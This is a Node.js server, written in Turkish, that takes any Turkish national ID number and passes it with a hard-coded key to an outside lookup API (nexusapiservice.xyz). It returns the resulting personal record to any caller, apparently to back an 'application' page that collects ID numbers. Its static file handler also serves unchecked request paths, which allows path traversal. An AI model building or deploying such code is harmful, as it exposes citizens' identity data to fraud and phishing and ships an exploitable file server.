const http = require('http');
const https = require('https');
const url = require('url');
const querystring = require('querystring');
const fs = require('fs');
const path = require('path');

const PORT = process.env.PORT || 3000;

// MIME types
const mimeTypes = {
  '.html': 'text/html',
  '.js': 'text/javascript',
  '.css': 'text/css',
  '.json': 'application/json',
  '.png': 'image/png',
  '.jpg': 'image/jpg',
  '.gif': 'image/gif',
  '.ico': 'image/x-icon',
  '.svg': 'image/svg+xml'
};

const server = http.createServer((req, res) => {
  const parsedUrl = url.parse(req.url, true);
  let pathname = parsedUrl.pathname;

  // API route: /api/get-tckn
  if (pathname === '/api/get-tckn' || pathname === '/get-tckn') {
    const { tc } = parsedUrl.query;

    if (!tc || tc.length !== 11) {
      res.writeHead(400, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ error: 'Geçerli bir TC kimlik numarası giriniz' }));
      return;
    }

    // TC Kimlik API endpoint
    const apiUrl = `https://nexusapiservice.xyz/servis/tckn/apiv2?hash=CcjS8ZvefIZccOZbr&auth=tosun&tc=${tc}`;

    https.get(apiUrl, (apiRes) => {
      let data = '';

      apiRes.on('data', (chunk) => {
        data += chunk;
      });

      apiRes.on('end', () => {
        try {
          const jsonData = JSON.parse(data);
          res.writeHead(200, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify(jsonData));
        } catch (error) {
          res.writeHead(500, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ 
            error: 'Sunucu hatası', 
            details: error.message 
          }));
        }
      });
    }).on('error', (error) => {
      console.error('Error:', error);
      res.writeHead(500, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ 
        error: 'Sunucu hatası', 
        details: error.message 
      }));
    });
    return;
  }

  // Form submit route: /submit
  if (pathname === '/submit' && req.method === 'POST') {
    let body = '';
    
    req.on('data', chunk => {
      body += chunk.toString();
    });
    
    req.on('end', () => {
      const formData = querystring.parse(body);
      const tc = formData.tckn || formData.tc;
      
      if (tc && tc.length === 11) {
        // basvur.html'ye TC ile yönlendir
        res.writeHead(302, {
          'Location': `/basvur.html?tc=${tc}`
        });
        res.end();
      } else {
        res.writeHead(400, { 'Content-Type': 'text/html' });
        res.end('<h1>Geçersiz TC Kimlik Numarası</h1>');
      }
    });
    return;
  }

  // Static file serving
  if (pathname === '/') {
    pathname = '/index.html';
  }

  const filePath = path.join(__dirname, pathname);
  const extname = String(path.extname(filePath)).toLowerCase();
  const contentType = mimeTypes[extname] || 'application/octet-stream';

  fs.readFile(filePath, (error, content) => {
    if (error) {
      if (error.code === 'ENOENT') {
        res.writeHead(404, { 'Content-Type': 'text/html' });
        res.end('<h1>404 - File Not Found</h1>');
      } else {
        res.writeHead(500);
        res.end(`Server Error: ${error.code}`);
      }
    } else {
      res.writeHead(200, { 'Content-Type': contentType });
      res.end(content, 'utf-8');
    }
  });
});

server.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});

module.exports = server;

